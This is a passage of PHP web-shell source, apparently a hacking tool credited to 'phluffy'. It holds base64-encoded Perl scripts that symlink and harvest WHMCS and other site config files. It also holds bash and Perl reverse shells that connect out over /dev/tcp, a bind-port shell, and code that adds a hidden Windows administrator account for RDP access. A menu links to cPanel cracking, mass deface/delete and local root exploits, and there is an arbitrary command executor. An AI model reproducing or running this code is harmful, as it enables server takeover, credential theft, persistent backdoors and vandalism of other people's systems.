dXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UQVJFQS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudGFyZWEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRhcmVhL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU1VQUE9SVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1N1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElORy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JpbGxpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQlVZL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTUFOQUdFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UU1VQUE9SVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudFN1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NIRUNLT1VUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jaGVja291dC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkdTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JBU0tFVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0Jhc2tldC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jhc2tldC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NFQ1VSRS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NlY3VyZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NlY3VyZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NBTEVTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU2FsZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zYWxlcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTEwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CaWxsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1BVUkNIQVNFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9wdXJjaGFzZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0FDQ09VTlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9BY2NvdW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYWNjb3VudC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1VTRVIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Vc2VyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdXNlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVFMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50cy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkdTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL01ZL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9teS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NlY3VyZS93aG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zZWN1cmUvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9wYW5lbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1cHBvcnQvb3JkZXIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9DQopOw0KZm9yZWFjaCAoQGFycmF5KXsNCglteSAkY29uZmlnbnlhID0gJF8tPntjb25maWdkaXJ9Ow0KCW15ICR0eXBlY29uZmlnID0gJF8tPnt0eXBlfTsNCglzeW1saW5rKCIkY29uZmlnbnlhIiwiaWR4X3N5bS8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQiKTsNCglta2RpciAiaWR4X3N5bS8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQiOw0KCXN5bWxpbmsoIiRjb25maWdueWEiLCJpZHhfc3ltLyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dC8weDE5OTkudHh0Iik7DQoJY29weSgiaWR4X3N5bS9uZW11LnR4dCIsImlkeF9zeW0vJHVzZXJueWEtJHR5cGVjb25maWcudHh0Ly5odGFjY2VzcyIpIDsNCgl9DQp9DQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50ICI8aGVhZD48dGl0bGU+QnlwYXNzIDQwNCBCeSAweDE5OTk8L3RpdGxlPjwvaGVhZD4iOw0KcHJpbnQgJzxtZXRhIGh0dHAtZXF1aXY9InJlZnJlc2giIGNvbnRlbnQ9IjU7IHVybD1pZHhfc3ltIi8+JzsNCnByaW50ICc8Ym9keT48Y2VudGVyPjxoMT4weDE5OTkgTmV2ZXIgRGllPC9oMT4nOw0KcHJpbnQgJzxhIGhyZWY9ImlkeF9zeW0iPktsaWsgRGlzaW5pPC9hPic7DQp1bmxpbmsoJDApOw==";
            save("/tmp/symlink.pl", "w", base64_decode($sym['code']));
            exe("perl /tmp/symlink.pl");
            sleep(1);
            @unlink("/tmp/symlink.pl");
            @unlink("passwd.txt");
            @unlink("idx_sym/pas.txt");
            @unlink("idx_sym/nemu.txt");
        }
        print "<div style='background: #ffffff; width: 100%; height: 100%'>";
        print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_sym/' frameborder='0' scrolling='yes'></iframe>";
        print "</div>";
    }
    elseif($toolsname === "network") {
        $args = explode(" ", $args);
        if($args[0] === "bc") {
            if(empty($args[1])) die(color(1, 1, "Set Your IP for BackConnect!"));
            if(empty($args[2])) die(color(1, 1, "Set Your PORT for BackConnect!"));
            if(empty($args[3])) die(color(1, 1, "Missing type of reverse shell: 'bash', 'perl'."));
            if($args[3] === "bash") {
                exe("/bin/bash -i >& /dev/tcp/".$args[1]."/".$args[2]." 0>&1");
            }
            elseif($args[3] === "perl") {
                $bc['code'] = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
                save("/tmp/bc.pl", "w", base64_decode($bc['code']));
                $bc['exec'] = exe("perl /tmp/bc.pl ".$args[1]." ".$args[2]." 1>/dev/null 2>&1 &");
                sleep(1);
                print "<pre>".$bc['exec']."\n".exe("ps aux | grep bc.pl")."</pre>";
                @unlink("/tmp/bc.pl");
            }
        }
        elseif($args[0] === "bp") {
            if(empty($args[1])) die(color(1, 1, "Set Your PORT for Bind Port!"));
            if(empty($args[2])) die(color(1, 1, "Missing type of reverse shell: 'bash', 'perl'."));
            if($args[2] === "perl") {
                $bp['code'] = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
                save("/tmp/bp.pl", "w", base64_decode($bp['code']));
                $bp['exec'] = exe("perl /tmp/bp.pl ".$args[1]." 1>/dev/null 2>&1 &");
                sleep(1);
                print "<pre>".$bp['exec']."\n".exe("ps aux | grep bp.pl")."</pre>";
                @unlink("/tmp/bp.pl");
            }
        }
        else {
            print color(1, 1, "Unknown '".$args[0]."'");
        }
    }
    elseif($toolsname === "krdp") {
        $args = explode(" ", $args);
        if(OS() !== "Windows") die(color(1, 1, "Just For Windows Server"));
        if(preg_match("/phluffy/", exe("net user"))) die(color(1, 1, "[INFO] username 'phluffy' already exists."));
        $add_user   = exe("net user phluffy phluffy /add");
        $add_groups1 = exe("net localgroup Administrators phluffy /add");
        $add_groups2 = exe("net localgroup Administrator phluffy /add");
        $add_groups3 = exe("net localgroup Administrateur phluffy /add");
        print "[ RDP ACCOUNT INFO ]<br>
        ------------------------------<br>
        IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
        Username: ".color(1, 2, "phluffy")."<br>
        Password: ".color(1, 2, "phluffy")."<br>
        ------------------------------<br><br>
        [ STATUS ]<br>
        ------------------------------<br>
        ";
        if($add_user) {
            print "[add user] -> ".color(1, 2, "SUCCESS")."<br>";
        } 
        else {
            print "[add user] -> ".color(1, 1, "FAILED")."<br>";
        }
        
        if($add_groups1) {
            print "[add localgroup Administrators] -> ".color(1, 2, "SUCCESS")."<br>";
        } 
        elseif($add_groups2) {
            print "[add localgroup Administrator] -> ".color(1, 2, "SUCCESS")."<br>";
        } 
        elseif($add_groups3) { 
            print "[add localgroup Administrateur] -> ".color(1, 2, "SUCCESS")."<br>";
        } 
        else {
            print "[add localgroup] -> ".color(1, 1, "FAILED")."<br>";
        }
        print "------------------------------<br>";
    }
}
function files_and_folder() {
    if(!is_dir(path())) die(color(1, 1, "Directory '".path()."' is not exists."));
    if(!is_readable(path())) die(color(1, 1, "Directory '".path()."' not readable."));
    print '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
           <tr>
           <th class="th_home"><center>Name</center></th>
           <th class="th_home"><center>Type</center></th>
           <th class="th_home"><center>Size</center></th>
           <th class="th_home"><center>Last Modified</center></th>
           <th class="th_home"><center>Owner/Group</center></th>
           <th class="th_home"><center>Permission</center></th>
           <th class="th_home"><center>Action</center></th>
           </tr>';
    if(function_exists('opendir')) {
        if($opendir = opendir(path())) {
            while(($readdir = readdir($opendir)) !== false) {
                $dir[] = $readdir;
            }
            closedir($opendir);
        }
        sort($dir);
    } else {
        $dir = scandir(path());
    }
    foreach($dir as $folder) {
        $dirinfo['path'] = path().DIRECTORY_SEPARATOR.$folder;
        if(!is_dir($dirinfo['path'])) continue;
        $dirinfo['type']  = filetype($dirinfo['path']);
        $dirinfo['time']  = date("F d Y g:i:s", filemtime($dirinfo['path']));
        $dirinfo['size']  = "-";
        $dirinfo['perms'] = writeable($dirinfo['path'], perms($dirinfo['path']));
        $dirinfo['link']  = ($folder === ".." ? "<a href='?dir=".dirname(path())."'>$folder</a>" : ($folder === "." ?  "<a href='?dir=".path()."'>$folder</a>" : "<a href='?dir=".$dirinfo['path']."'>$folder</a>"));
        $dirinfo['action']= ($folder === '.' || $folder === '..') ? "<a href='?act=newfile&dir=".path()."'>newfile</a> | <a href='?act=newfolder&dir=".path()."'>newfolder</a>" : "<a href='?act=rename_folder&dir=".$dirinfo['path']."'>RenamE</a> | <a href='?act=delete_folder&dir=".$dirinfo['path']."'>Delete</a>";
        if(function_exists('posix_getpwuid')) {
            $dirinfo['owner'] = (object) @posix_getpwuid(fileowner($dirinfo['path']));
            $dirinfo['owner'] = $dirinfo['owner']->name;
        } else {
            $dirinfo['owner'] = fileowner($dirinfo['path']);
        }
        if(function_exists('posix_getgrgid')) {
            $dirinfo['group'] = (object) @posix_getgrgid(filegroup($dirinfo['path']));
            $dirinfo['group'] = $dirinfo['group']->name;
        } else {
            $dirinfo['group'] = filegroup($dirinfo['path']);
        }
        print "<tr>";
        print "<td class='td_home'><img src='https://i.ibb.co/sb3nk8S/canva-photo-editor.png'>".$dirinfo['link']."</td>";
        print "<td class='td_home' style='text-align: center;'>".$dirinfo['type']."</td>";
        print "<td class='td_home' style='text-align: center;'>".$dirinfo['size']."</td>";
        print "<td class='td_home' style='text-align: center;'>".$dirinfo['time']."</td>";
        print "<td class='td_home' style='text-align: center;'>".$dirinfo['owner'].DIRECTORY_SEPARATOR.$dirinfo['group']."</td>";
        print "<td class='td_home' style='text-align: center;'>".$dirinfo['perms']."</td>";
        print "<td class='td_home' style='padding-left: 15px;'>".$dirinfo['action']."</td>";
        print "</tr>";
    }
    foreach($dir as $files) {
        $fileinfo['path'] = path().DIRECTORY_SEPARATOR.$files;
        if(!is_file($fileinfo['path'])) continue;
        $fileinfo['type'] = filetype($fileinfo['path']);
        $fileinfo['time'] = date("F d Y g:i:s", filemtime($fileinfo['path']));
        $fileinfo['size'] = filesize($fileinfo['path'])/1024;
        $fileinfo['size'] = round($fileinfo['size'],3);
        $fileinfo['size'] = ($fileinfo['size'] > 1024) ? round($fileinfo['size']/1024,2). "MB" : $fileinfo['size']. "KB";
        $fileinfo['perms']= writeable($fileinfo['path'], perms($fileinfo['path']));
        if(function_exists('posix_getpwuid')) {
            $fileinfo['owner'] =  (object) @posix_getpwuid(fileowner($fileinfo['path']));
            $fileinfo['owner'] = $fileinfo['owner']->name;
        } else {
            $fileinfo['owner'] = fileowner($fileinfo['path']);
        }
        if(function_exists('posix_getgrgid')) {
            $fileinfo['group'] = (object) @posix_getgrgid(filegroup($fileinfo['path']));
            $fileinfo['group'] = $fileinfo['group']->name;
        } else {
            $fileinfo['group'] = filegroup($fileinfo['path']);
        }
        print "<tr>";
        print "<td class='td_home'><img src='https://i.ibb.co/zPRgbcC/canva-photo-editor.png'><a href='?act=view&dir=".path()."&file=".$fileinfo['path']."'>$files</a></td>";
        print "<td class='td_home' style='text-align: center;'>".$fileinfo['type']."</td>";
        print "<td class='td_home' style='text-align: center;'>".$fileinfo['size']."</td>";
        print "<td class='td_home' style='text-align: center;'>".$fileinfo['time']."</td>";
        print "<td class='td_home' style='text-align: center;'>".$fileinfo['owner'].DIRECTORY_SEPARATOR.$fileinfo['group']."</td>";
        print "<td class='td_home' style='text-align: center;'>".$fileinfo['perms']."</td>";
        print "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=".path()."&file=".$fileinfo['path']."'>EdiT</a> | <a href='?act=rename&dir=".path()."&file=".$fileinfo['path']."'>RenamE</a> | <a href='?act=delete&dir=".path()."&file=".$fileinfo['path']."'>Delete</a> | <a href='?act=download&dir=".path()."&file=".$fileinfo['path']."'>InstalL</a></td>";
        print "</tr>";
    }
    print "</table>";
    print "<center>Copyright &copy; ".date("Y")." - <a href='https://www.facebook.com/lulz.luffy/' target='_blank'>".color(1, 2, "phluffy")."</a></center>";
}
function action() {
    tools("upload");
    tools("cmd");
    print "<hr style='margin-top: 15px; margin-bottom: 10px;'>";
    print "<center>";
    print "<ul>";
    print "<li>[ <a href='?'>Home</a> ]</li>";
    print "<li>[ <a href='?dir=".path()."&do=fakeroot'>Fake Root</a> ]</li>";
    print "<li>[ <a href='?dir=".path()."&do=cpanel'>cPanel Crack</a> ]</li>";
    print "<li>[ <a href='?dir=".path()."&do=mpc'>Mass Password Change</a> ]</li>";
    print "<li>[ <a href='?dir=".path()."&do=mass'>Mass Deface/Delete</a> ]</li>";
    print "<li>[ <a href='?dir=".path()."&do=lre'>Local Root Exploiter</a> ]</li>";
    print "<li>[ <a href='?dir=".path()."&do=zoneh'>Zone-H</a> ]</li>";
    print "</ul>";
    print "</center>";
    print "<hr style='margin-top: 15px; margin-bottom: 10px;'>";
    if(isset($_GET['do'])) {
        if($_GET['do'] === "cmd") {
            if(isset($_POST['cmd'])) {
                if(preg_match("/^rf (.*)$/", $_POST['cmd'], $match)) {
                    tools("readfile", $match[1]);
                }
                elseif(preg_match("/^spawn (.*)$/", $_POST['cmd'], $match)) {
                    tools("spawn", $match[1]);
                }
                elseif(preg_match("/^symlink$/", $_POST['cmd'], $match)) {
                    tools("symlink");
                }
                elseif(preg_match("/^rvr (.*)$/", $_POST['cmd'], $match)) {
                    tools("network", $match[1]);
                }
                elseif(preg_match("/^krdp$/", $_POST['cmd'])) {
                    tools("krdp");
                }
                elseif(preg_match("/^jumping$/", $_POST['cmd'])) {
                    tools("jumping");
                }
                elseif(preg_match("/^idxconfig$/", $_POST['cmd'])) {
                    tools("idxconfig");
                }
                elseif(preg_match("/^logout$/", $_POST['cmd'])) {
                    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
                    print "<script>window.location='?';</script>";
                }
                elseif(preg_match("/^killme$/", $_POST['cmd'])) {
                    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
                    @unlink(__FILE__);
                    print "<script>window.location='?';</script>";
                }
                else {
                    print "<pre>".exe($_POST['cmd'])."</pre>";
                }
            }
            else {
                files_and_folder();
            }
        }
        elseif($_GET['do'] === "zoneh") {
